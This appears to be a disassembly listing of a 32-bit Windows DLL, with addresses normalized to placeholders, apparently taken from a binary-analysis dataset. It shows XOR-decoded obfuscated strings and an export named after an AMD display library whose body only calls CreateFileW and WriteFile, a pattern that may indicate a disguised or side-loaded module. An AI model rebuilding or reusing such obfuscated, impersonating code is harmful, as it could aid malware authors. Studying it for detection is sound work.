retn 0x20
sub_10023060
push ebp
mov ebp esp
push 0xffffffff
push sub_10081c9d
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x114 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x118 ] ecx
mov ecx [ r--data ]
mov [ ebp - 0x110 ] eax
movsx eax [ ecx ]
xor eax 0x61
xor ecx ecx
and eax 0xff
mov [ ebp - 0x104 ] ax
mov [ ebp - 0x102 ] cx
mov ecx [ r--data ]
xor edi edi
xor eax eax
movsx esi [ ecx + eax ]
xor esi eax
xor esi 0xff8b
and esi 0xff
mov [ ebp + eax * 2 - 0x20 ] si
inc eax
cmp eax 0x2
jb r-xdata
xor eax eax
mov [ ebp - 0x1c ] ax
xor ecx ecx
mov eax edx
mov [ ebp - 0xb4 ] 0x7
mov [ ebp - 0xb8 ] edi
mov [ ebp - 0xc8 ] cx
lea esi [ eax + 0x2 ]
mov cx [ eax ]
add eax 0x2
cmp cx di
jne r-xdata
sub eax esi
sar eax 0x1
push eax
push edx
lea ecx [ ebp - 0xc8 ]
call sub_1005e3c0
lea edx [ ebp - 0xc8 ]
push edx
lea edx [ ebp - 0x104 ]
lea esi [ ebp - 0x100 ]
mov [ ebp - 0x4 ] edi
call sub_10036350
add esp 0x4
push eax
lea edx [ ebp - 0x20 ]
lea esi [ ebp - 0xe4 ]
mov [ ebp - 0x4 ] 0x1
call sub_10045750
add esp 0x4
mov ebx 0x8
cmp [ ebp - 0xec ] ebx
jb r-xdata
mov esi 0x7
xor ecx ecx
mov [ ebp - 0xec ] esi
mov [ ebp - 0xf0 ] edi
mov [ ebp - 0x100 ] cx
mov [ ebp - 0x4 ] 0x4
cmp [ ebp - 0xb4 ] ebx
jb r-xdata
mov eax [ ebp - 0x100 ]
push eax
call sub_10065045
add esp 0x4
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0xb4 ] esi
mov [ ebp - 0xb8 ] edi
mov [ ebp - 0xc8 ] ax
mov edi edi
mov edx [ ebp - 0xc8 ]
push edx
call sub_10065045
add esp 0x4
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0xffd9
and edx 0xff
mov [ ebp + eax * 2 - 0x58 ] dx
inc eax
cmp eax 0x1a
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x24 ] ax
lea esp [ esp ]
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0xffce
and edx 0xff
mov [ ebp + eax * 2 - 0x18 ] dx
inc eax
cmp eax 0x2
jb r-xdata
xor eax eax
mov [ ebp - 0x60 ] esi
mov esi [ ebp - 0x114 ]
mov [ ebp - 0x14 ] ax
xor ecx ecx
mov eax esi
mov [ ebp - 0x64 ] edi
mov [ ebp - 0x74 ] cx
lea edx [ eax + 0x2 ]
lea ebx [ ebx ]
mov cx [ eax ]
add eax 0x2
cmp cx di
jne r-xdata
sub eax edx
sar eax 0x1
push eax
push esi
lea ecx [ ebp - 0x74 ]
call sub_1005e3c0
lea edx [ ebp - 0x74 ]
push edx
lea edx [ ebp - 0x58 ]
lea esi [ ebp - 0x90 ]
mov [ ebp - 0x4 ] 0x5
call sub_10036350
add esp 0x4
push eax
lea edx [ ebp - 0x18 ]
lea esi [ ebp - 0xac ]
mov [ ebp - 0x4 ] 0x6
call sub_10045750
add esp 0x4
push 0xffffffff
push edi
push eax
lea ecx [ ebp - 0xe4 ]
mov [ ebp - 0x4 ] 0x7
call sub_1000c1e0
cmp [ ebp - 0x98 ] ebx
jb r-xdata
xor ecx ecx
mov esi 0x7
mov [ ebp - 0x98 ] esi
mov [ ebp - 0x9c ] edi
mov [ ebp - 0xac ] cx
cmp [ ebp - 0x7c ] ebx
jb r-xdata
mov eax [ ebp - 0xac ]
push eax
call sub_10065045
add esp 0x4
xor eax eax
mov [ ebp - 0x4 ] 0x4
mov [ ebp - 0x7c ] esi
mov [ ebp - 0x80 ] edi
mov [ ebp - 0x90 ] ax
cmp [ ebp - 0x60 ] ebx
jb r-xdata
mov edx [ ebp - 0x90 ]
push edx
call sub_10065045
add esp 0x4
mov edx [ r--data ]
movsx eax [ edx ]
mov edx [ r--data ]
xor eax 0x5f
and eax 0xff
xor ecx ecx
mov [ ebp - 0x108 ] ax
mov [ ebp - 0x106 ] cx
movsx eax [ edx ]
xor eax 0x2a
and eax 0xff
mov [ ebp - 0x60 ] esi
mov esi [ ebp - 0x118 ]
xor edx edx
mov [ ebp - 0x10c ] ax
mov eax esi
mov [ ebp - 0x74 ] dx
mov [ ebp - 0x10a ] cx
mov [ ebp - 0x64 ] edi
lea edx [ eax + 0x2 ]
jmp r-xdata
mov ecx [ ebp - 0x74 ]
push ecx
call sub_10065045
add esp 0x4
mov cx [ eax ]
add eax 0x2
cmp cx di
jne r-xdata
sub eax edx
sar eax 0x1
push eax
push esi
lea ecx [ ebp - 0x74 ]
call sub_1005e3c0
lea eax [ ebp - 0x74 ]
push eax
lea edx [ ebp - 0x108 ]
lea esi [ ebp - 0xac ]
mov [ ebp - 0x4 ] bl
call sub_10036350
add esp 0x4
push eax
lea edx [ ebp - 0x10c ]
lea esi [ ebp - 0x90 ]
mov [ ebp - 0x4 ] 0x9
call sub_10045750
add esp 0x4
push 0xffffffff
push edi
push eax
lea ecx [ ebp - 0xe4 ]
mov [ ebp - 0x4 ] 0xa
call sub_1000c1e0
cmp [ ebp - 0x7c ] ebx
jb r-xdata
xor edx edx
mov esi 0x7
mov [ ebp - 0x7c ] esi
mov [ ebp - 0x80 ] edi
mov [ ebp - 0x90 ] dx
cmp [ ebp - 0x98 ] ebx
jb r-xdata
mov ecx [ ebp - 0x90 ]
push ecx
call sub_10065045
add esp 0x4
xor ecx ecx
mov [ ebp - 0x98 ] esi
mov [ ebp - 0x9c ] edi
mov [ ebp - 0xac ] cx
cmp [ ebp - 0x60 ] ebx
jb r-xdata
mov eax [ ebp - 0xac ]
push eax
call sub_10065045
add esp 0x4
mov ecx [ ebp - 0xe4 ]
cmp [ ebp - 0xd0 ] ebx
jae r-xdata
mov edx [ ebp - 0x74 ]
push edx
call sub_10065045
add esp 0x4
mov eax [ ebp - 0x110 ]
push eax
call sub_100153b0
add esp 0x4
mov esi eax
cmp [ ebp - 0xd0 ] ebx
jb r-xdata
lea ecx [ ebp - 0xe4 ]
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0xe4 ]
push ecx
call sub_10065045
add esp 0x4
sub_10023480
push ebp
mov ebp esp
push 0xffffffff
push sub_1007e1c1
mov eax [ fs : 0x0 ]
push eax
sub esp 0x5c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
lea ecx [ ebp - 0x60 ]
mov [ ebp - 0x68 ] esi
mov [ ebp - 0x64 ] 0x0
call sub_100243a0
push edi
push esi
lea ecx [ ebp - 0x60 ]
mov [ ebp - 0x4 ] 0x1
call sub_10063150
lea ecx [ ebp - 0x60 ]
mov [ ebp - 0x64 ] 0x1
mov [ ebp - 0x4 ] 0x0
call sub_10064220
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
sub_10023510
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_1000e930
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10065045
add esp 0x4
sub_10023540
push ebp
mov ebp esp
push 0xffffffff
push sub_10080111
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi edx
xor eax eax
sub ecx eax
je r-xdata
push 0xe8
call sub_1005ac7e
add esp 0x4
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
dec ecx
je r-xdata
xor eax eax
mov ecx [ ebp + 0x1c ]
mov edx [ ebp + 0x18 ]
push edi
push ebx
push esi
push ecx
mov ecx [ ebp + 0x10 ]
push edx
mov edx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x14 ]
push edx
mov edx [ ebp + 0x8 ]
mov esi eax
call sub_10054830
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
push 0xf0
call sub_1005ac7e
add esp 0x4
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x1
test eax eax
je r-xdata
dec ecx
jne r-xdata
mov ecx [ ebp + 0x1c ]
mov edx [ ebp + 0x18 ]
push edi
push ebx
push esi
push ecx
mov ecx [ ebp + 0x10 ]
push edx
mov edx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x14 ]
push edx
mov edx [ ebp + 0x8 ]
mov esi eax
call sub_10012e90
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
push 0x2e8
call sub_1005ac7e
add esp 0x4
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x2
test eax eax
je r-xdata
mov ecx [ ebp + 0x1c ]
mov edx [ ebp + 0x18 ]
push edi
push ebx
push esi
push ecx
mov ecx [ ebp + 0x10 ]
push edx
mov edx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x14 ]
push edx
mov edx [ ebp + 0x8 ]
mov esi eax
call sub_1003d450
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
sub_10023671
push 0x8
push r--data
call sub_10078b50
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_10078b95
retn 0x4
mov eax [ esi + 0x24 ]
test eax eax
je r-xdata
mov eax [ esi + 0x2c ]
test eax eax
je r-xdata
push eax
call sub_10020a90
pop ecx
mov eax [ esi + 0x34 ]
test eax eax
je r-xdata
push eax
call sub_10020a90
pop ecx
mov eax [ esi + 0x3c ]
test eax eax
je r-xdata
push eax
call sub_10020a90
pop ecx
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
push eax
call sub_10020a90
pop ecx
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
push eax
call sub_10020a90
pop ecx
mov eax [ esi + 0x48 ]
test eax eax
je r-xdata
push eax
call sub_10020a90
pop ecx
mov eax [ esi + 0x5c ]
cmp eax r--data
je r-xdata
push eax
call sub_10020a90
pop ecx
push 0xd
call sub_1003938d
pop ecx
and [ ebp - 0x4 ] 0x0
mov edi [ esi + 0x68 ]
test edi edi
je r-xdata
push eax
call sub_10020a90
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1002378b
push 0xc
call sub_1003938d
pop ecx
mov [ ebp - 0x4 ] 0x1
mov edi [ esi + 0x6c ]
test edi edi
je r-xdata
push edi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10023797
push esi
call sub_10020a90
pop ecx
push edi
call sub_10015308
pop ecx
cmp edi [ rw-data ]
je r-xdata
cmp edi rw-data
je r-xdata
cmp edi rw-data
je r-xdata
push edi
call sub_10020a90
pop ecx
cmp [ edi ] 0x0
jne r-xdata
push edi
call sub_1000878a
pop ecx
sub_100237a0
push ebp
mov ebp esp
sub esp 0x834
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
push ebx
push esi
push edi
mov edi ecx
mov ecx [ eax + 0x110 ]
push 0xffffffff
push ecx
call [ WaitForSingleObject@IAT ]
mov eax [ edi + 0x4 ]
mov [ ebp - 0x82c ] 0x0
test eax eax
je r-xdata
mov eax 0x4
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
push eax
lea edx [ ebp - 0x418 ]
push edx
call [ StrCpyW@IAT ]
mov esi [ edi + 0x8 ]
lea eax [ ebp - 0x82c ]
push eax
lea ebx [ ebp - 0x210 ]
call sub_10030bd0
add esp 0x4
test eax eax
je r-xdata
mov esi [ edi + 0xc ]
lea ecx [ ebp - 0x620 ]
push ecx
lea ebx [ ebp - 0x828 ]
call sub_1002d380
add esp 0x4
test eax eax
je r-xdata
mov eax 0x5
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov dl [ edi + 0x10 ]
mov eax [ edi + 0x14 ]
mov edi [ edi + 0x18 ]
mov ecx [ ebp - 0x82c ]
push edi
push eax
mov [ ebp - 0x830 ] dl
mov eax [ ebp - 0x830 ]
push eax
push ecx
lea edx [ ebp - 0x210 ]
push edx
lea eax [ ebp - 0x418 ]
push eax
lea edx [ ebp - 0x620 ]
lea ecx [ ebp - 0x828 ]
xor ebx ebx
xor esi esi
call sub_1000f8d0
test eax eax
jne r-xdata
mov eax 0x6
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
mov ecx [ eax + 0x110 ]
push ecx
mov [ eax + 0x104 ] ebx
mov [ eax + 0x10c ] ebx
mov [ eax + 0x108 ] 0x1
call [ ReleaseMutex@IAT ]
mov ecx [ ebp - 0x4 ]
pop edi
mov eax esi
pop esi
xor ecx ebp
pop ebx
call sub_1004c3b6
mov esp ebp
pop ebp
retn
lea esi [ ebx + 0x8 ]
ADL_Main_Control_Refresh
push ebp
mov ebp esp
sub esp 0x10c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push 0x0
push 0x80
push 0x3
push 0x0
push 0x0
push 0x80000000
push r--data
call [ CreateFileW@IAT ]
push 0x0
lea ecx [ ebp - 0x10c ]
push ecx
push 0x104
lea edx [ ebp - 0x108 ]
push edx
push eax
call [ WriteFile@IAT ]
call [ GetLastError@IAT ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
lea eax [ eax + eax * 2 - 0xf ]
call sub_1004c3b6
mov esp ebp
pop ebp
retn
sub_10023990
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push esi
push edi
mov esi ecx
test edx edx
je r-xdata
mov eax [ esi + 0x10 ]
or ecx 0xffffffff
push ebx
mov ebx [ ebp + 0xc ]
sub ecx eax
cmp ecx ebx
ja r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx 0x8
jb r-xdata
test ebx ebx
je r-xdata
push r--data
call sub_100616c6
mov eax esi
mov eax [ esi ]
jmp r-xdata
pop ebx
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
lea edi [ eax + ebx ]
cmp edi 0x7ffffffe
jbe r-xdata
cmp ecx 0x8
jb r-xdata
cmp edx eax
jb r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx edi
jae r-xdata
push r--data
call sub_100616c6
mov eax esi
mov eax [ esi ]
jmp r-xdata
test edi edi
jne r-xdata
push eax
push edi
mov ecx esi
call sub_1000fb70
mov edx [ ebp + 0x8 ]
test edi edi
je r-xdata
cmp ecx 0x8
jb r-xdata
mov edi [ esi + 0x10 ]
lea eax [ eax + edi * 2 ]
cmp eax edx
jbe r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov [ esi + 0x10 ] edi
cmp ecx 0x8
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
pop ebx
mov eax esi
xor edx edx
pop edi
mov [ eax ] dx
pop esi
pop ebp
retn 0x8
mov eax [ esi ]
pop ebx
xor edx edx
mov [ eax ] dx
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
mov ecx [ ebp + 0xc ]
push ecx
sub edx eax
sar edx 0x1
push edx
push esi
mov ecx esi
call sub_1000c1e0
pop edi
pop esi
pop ebp
retn 0x8
mov eax esi
xor ecx ecx
mov [ eax + edi * 2 ] cx
mov eax [ esi ]
xor ecx ecx
pop ebx
mov [ eax + edi * 2 ] cx
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
lea ecx [ ebx + ebx ]
push ecx
push edx
mov edx [ esi + 0x10 ]
lea eax [ eax + edx * 2 ]
push eax
call sub_10078600
add esp 0xc
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] edi
jb r-xdata
sub_10023aaa
push 0x18
push r--data
call sub_10078b50
or [ ebp - 0x1c ] 0xffffffff
xor edi edi
mov [ ebp - 0x24 ] edi
push 0xb
call sub_1003a017
pop ecx
test eax eax
jne r-xdata
push 0xb
call sub_1003938d
pop ecx
mov [ ebp - 0x4 ] edi
or eax 0xffffffff
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10023c3a
mov eax [ ebp - 0x1c ]
mov esi [ edi * 4 + rw-data ]
test esi esi
je r-xdata
call sub_10078b95
retn
push 0x40
push 0x20
call sub_10025450
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
je r-xdata
mov [ ebp - 0x20 ] esi
mov eax [ edi * 4 + rw-data ]
add eax 0x800
cmp esi eax
jae r-xdata
lea ecx [ edi * 4 + rw-data ]
mov [ ecx ] eax
add [ rw-data ] 0x20
cmp [ ebp - 0x1c ] 0xffffffff
jne r-xdata
test [ esi + 0x4 ] 0x1
jne r-xdata
shl edi 0x5
mov [ ebp - 0x1c ] edi
mov eax edi
sar eax 0x5
mov ecx edi
and ecx 0x1f
shl ecx 0x6
mov eax [ eax * 4 + rw-data ]
mov [ eax + ecx + 0x4 ] 0x1
push edi
call sub_10038317
pop ecx
test eax eax
jne r-xdata
mov [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
mov [ eax + 0x5 ] 0xa
and [ eax + 0x8 ] 0x0
add eax 0x40
mov [ ebp - 0x20 ] eax
jmp r-xdata
inc edi
jmp r-xdata
add esi 0x40
jmp r-xdata
cmp [ esi + 0x8 ] 0x0
jne r-xdata
or [ ebp - 0x1c ] 0xffffffff
mov edx [ ecx ]
add edx 0x800
cmp eax edx
jae r-xdata
mov [ ebp - 0x28 ] edi
cmp edi 0x40
jge r-xdata
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
push 0xa
call sub_1003938d
pop ecx
xor ebx ebx
inc ebx
mov [ ebp - 0x4 ] ebx
cmp [ esi + 0x8 ] 0x0
jne r-xdata
lea ebx [ esi + 0xc ]
push ebx
call [ EnterCriticalSection@IAT ]
test [ esi + 0x4 ] 0x1
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_10023b7c
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
jne r-xdata
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
push ebx
call [ LeaveCriticalSection@IAT ]
inc [ esi + 0x8 ]
mov [ ebp - 0x24 ] ebx
jmp r-xdata
mov [ esi + 0x4 ] 0x1
or [ esi ] 0xffffffff
sub esi [ edi * 4 + rw-data ]
sar esi 0x6
mov eax edi
shl eax 0x5
add esi eax
mov [ ebp - 0x1c ] esi
sub_10023c43
push 0xc
mov eax sub_1007eb1d
call sub_10050d0f
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov eax [ ebp + 0xc ]
and eax 0x2
mov [ ebp - 0x14 ] eax
je r-xdata
mov edi [ ebp + 0xc ]
and edi 0x8
je r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
cmp edi ebx
je r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
mov ecx rw-data
call sub_10007a60
push [ ebp + 0x14 ]
mov esi eax
call sub_10018685
push esi
push eax
push [ ebp + 0x10 ]
call sub_100112ed
add esp 0x10
push 0x20
call sub_1005ac7e
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
mov edi [ ebp + 0x14 ]
cmp [ ebp + 0x14 ] ebx
jne r-xdata
mov ecx rw-data
call sub_10007a60
push [ ebp + 0x14 ]
mov esi eax
call sub_10064b18
push esi
push eax
push [ ebp + 0x10 ]
call sub_100112ed
add esp 0x10
push 0x10
call sub_1005ac7e
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
xor esi esi
push [ ebp + 0x8 ]
mov ecx esi
mov [ esi + 0x4 ] ebx
mov [ esi ] r--data
call sub_1002097b
jmp r-xdata
test [ ebp + 0xc ] 0x20
je r-xdata
cmp edi ebx
jne r-xdata
mov ecx rw-data
call sub_10007a60
push [ ebp + 0x14 ]
mov esi eax
call sub_10047f11
push esi
push eax
push [ ebp + 0x10 ]
call sub_100112ed
add esp 0x10
push 0x10
call sub_1005ac7e
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
xor esi esi
mov [ esi + 0x4 ] ebx
mov [ esi ] r--data
call sub_1006312b
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
mov ecx rw-data
call sub_10007a60
push eax
push esi
push [ ebp + 0x10 ]
call sub_100112ed
add esp 0xc
jmp r-xdata
mov eax [ ebp + 0xc ]
and eax 0x4
mov [ ebp - 0x10 ] eax
je r-xdata
cmp edi ebx
jne r-xdata
mov ecx rw-data
call sub_10007a60
push edi
mov esi eax
call sub_100046ba
push esi
push eax
push [ ebp + 0x10 ]
call sub_100112ed
add esp 0x10
push 0x10
call sub_1005ac7e
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
mov edi [ ebp + 0x14 ]
cmp edi ebx
jne r-xdata
xor esi esi
mov [ esi + 0x4 ] ebx
mov [ esi ] r--data
call sub_1006312b
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
mov ecx rw-data
call sub_10007a60
push eax
push esi
push [ ebp + 0x10 ]
call sub_100112ed
add esp 0xc
jmp r-xdata
cmp [ ebp - 0x10 ] ebx
je r-xdata
cmp edi ebx
jne r-xdata
mov ecx rw-data
call sub_10007a60
push edi
mov esi eax
call sub_10035802
push esi
push eax
push [ ebp + 0x10 ]
call sub_100112ed
add esp 0x10
push 0x8
call sub_1005ac7e
pop ecx
cmp eax ebx
je r-xdata
xor esi esi
mov [ esi + 0x4 ] ebx
mov [ esi ] r--data
call sub_10044c11
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
mov ecx rw-data
call sub_10007a60
push edi
mov esi eax
call sub_10018820
push esi
push eax
push [ ebp + 0x10 ]
call sub_100112ed
add esp 0x10
jmp r-xdata
push 0x18
call sub_1005ac7e
mov esi eax
pop ecx
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] 0x7
cmp esi ebx
je r-xdata
cmp edi ebx
je r-xdata
mov ecx rw-data
call sub_10007a60
push eax
push esi
push [ ebp + 0x10 ]
call sub_100112ed
add esp 0xc
jmp r-xdata
mov edi r--data
cmp [ ebp - 0x10 ] ebx
je r-xdata
cmp edi ebx
jne r-xdata
mov ecx rw-data
call sub_10007a60
push edi
mov esi eax
call sub_1003fc68
push esi
push eax
push [ ebp + 0x10 ]
call sub_100112ed
add esp 0x10
push 0x10
call sub_1005ac7e
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
xor esi esi
mov [ eax + 0x4 ] ebx
mov [ eax ] r--data
mov esi eax
jmp r-xdata
mov ecx rw-data
call sub_10007a60
push eax
push esi
push [ ebp + 0x10 ]
call sub_100112ed
add esp 0xc
jmp r-xdata
push ebx
push ebx
call sub_1005e982
xor edx edx
pop ecx
inc edx
pop ecx
mov ecx eax
shl edx cl
sar edx 0x1
test [ ebp + 0xc ] edx
je r-xdata
xor esi esi
mov [ esi + 0x4 ] ebx
push ebx
push [ ebp + 0x8 ]
mov ecx esi
mov [ ebp - 0x4 ] 0x8
mov [ esi ] r--data
call sub_10039ea0
jmp r-xdata
mov edi [ ebp + 0xc ]
and edi 0x10
je r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
mov ecx rw-data
call sub_10007a60
push edi
mov esi eax
call sub_1004579c
push esi
push eax
push [ ebp + 0x10 ]
call sub_100112ed
add esp 0x10
push 0x10
call sub_1005ac7e
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
xor esi esi
mov [ esi + 0x4 ] ebx
mov [ esi ] r--data
call sub_1006312b
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
mov ecx rw-data
call sub_10007a60
push eax
push esi
push [ ebp + 0x10 ]
call sub_100112ed
add esp 0xc
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov ecx rw-data
call sub_10007a60
push eax
push esi
push [ ebp + 0x10 ]
call sub_100112ed
add esp 0xc
jmp r-xdata
cmp edi ebx
je r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
mov ecx rw-data
call sub_10007a60
push [ ebp + 0x14 ]
mov esi eax
call sub_10030263
push esi
push eax
push [ ebp + 0x10 ]
call sub_100112ed
add esp 0x10
push 0x34
call sub_1005ac7e
mov esi eax
pop ecx
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x4 ] 0x10
cmp esi ebx
je r-xdata
xor esi esi
mov [ esi + 0x4 ] ebx
mov [ esi ] r--data
call sub_1006312b
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
mov ecx rw-data
call sub_10007a60
push eax
push esi
push [ ebp + 0x10 ]
call sub_100112ed
add esp 0xc
jmp r-xdata
cmp [ ebp - 0x14 ] ebx
je r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
mov ecx rw-data
call sub_10007a60
push [ ebp + 0x14 ]
mov esi eax
call sub_1002a50f
push esi
push eax
push [ ebp + 0x10 ]
call sub_100112ed
add esp 0x10
push 0x1c
call sub_1005ac7e
pop ecx
mov ecx eax
mov [ ebp + 0xc ] ecx
mov [ ebp - 0x4 ] 0x1b
cmp ecx ebx
je r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
xor esi esi
mov [ esi + 0x4 ] ebx
push ebx
push [ ebp + 0x8 ]
mov ecx esi
mov [ ebp - 0x4 ] 0x11
mov [ esi ] edi
mov [ esi + 0x28 ] bl
call sub_100123d5
mov [ esi ] r--data
jmp r-xdata
mov ecx rw-data
call sub_10007a60
push eax
push esi
push [ ebp + 0x10 ]
call sub_100112ed
add esp 0xc
jmp r-xdata
call sub_1001a1b3
retn
cmp [ ebp + 0x14 ] ebx
jne r-xdata
mov ecx rw-data
call sub_10007a60
push [ ebp + 0x14 ]
mov esi eax
call sub_100541e5
push esi
push eax
push [ ebp + 0x10 ]
call sub_100112ed
add esp 0x10
push 0x14
call sub_1005ac7e
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
xor esi esi
push ebx
push [ ebp + 0x8 ]
call sub_1005206b
mov esi eax
jmp r-xdata
mov ecx rw-data
call sub_10007a60
push [ ebp + 0x14 ]
mov esi eax
call sub_10037fc8
push esi
push eax
push [ ebp + 0x10 ]
call sub_100112ed
add esp 0x10
push 0x34
call sub_1005ac7e
mov esi eax
pop ecx
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x4 ] 0x16
cmp esi ebx
je r-xdata
cmp [ ebp - 0x10 ] ebx
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov ecx rw-data
call sub_10007a60
push eax
push esi
push [ ebp + 0x10 ]
call sub_100112ed
add esp 0xc
jmp r-xdata
mov ecx rw-data
call sub_10007a60
push [ ebp + 0x14 ]
mov esi eax
call sub_10002ce8
push esi
push eax
push [ ebp + 0x10 ]
call sub_100112ed
add esp 0x10
push 0x10
call sub_1005ac7e
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
xor esi esi
push [ ebp + 0x8 ]
mov [ esi + 0x4 ] ebx
mov [ esi ] r--data
mov ecx esi
mov [ esi + 0x8 ] ebx
call sub_1001c782
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov ecx rw-data
call sub_10007a60
push eax
push esi
push [ ebp + 0x10 ]
call sub_100112ed
add esp 0xc
jmp r-xdata
xor esi esi
mov [ esi + 0x4 ] ebx
push ebx
push [ ebp + 0x8 ]
mov ecx esi
mov [ ebp - 0x4 ] 0x17
mov [ esi ] edi
mov [ esi + 0x28 ] 0x1
call sub_100123d5
mov [ esi ] r--data
jmp r-xdata
xor esi esi
mov [ esi + 0x4 ] ebx
mov [ esi ] r--data
call sub_1006312b
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
mov ecx rw-data
call sub_10007a60
push eax
push esi
push [ ebp + 0x10 ]
call sub_100112ed
add esp 0xc
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov ecx rw-data
call sub_10007a60
push eax
push esi
push [ ebp + 0x10 ]
call sub_100112ed
add esp 0xc
jmp r-xdata
mov ecx rw-data
call sub_10007a60
push eax
push esi
push [ ebp + 0x10 ]
call sub_100112ed
add esp 0xc
jmp r-xdata
sub_10024280
push ebp
mov ebp esp
fld [ ebp + 0x8 ]
mov ecx [ rw-data ]
fld [ r--data ]
fsubr st1
fstp [ ebp + 0x8 ]
fld [ ebp + 0x8 ]
fabs
fstp [ ebp + 0x8 ]
